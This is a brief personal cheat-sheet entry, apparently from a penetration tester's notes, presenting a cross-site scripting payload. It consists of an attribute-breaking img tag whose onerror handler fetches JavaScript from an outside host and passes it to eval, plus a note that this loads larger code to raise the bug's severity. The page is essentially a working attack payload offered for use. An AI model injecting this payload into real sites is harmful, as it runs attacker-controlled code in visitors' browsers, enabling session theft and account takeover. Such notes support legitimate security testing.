---
description: Some payloads I use when I try XSS
---

# XSS

### Payload to load external javascript

```html
"><img src=x onerror="fetch('//url.com/').then(r => r.text().then(text => eval(text)))">
```

By using this you will load the content of url and load bigger javascript code.

It can be useful when trying to increase the severity of the vulnerability.
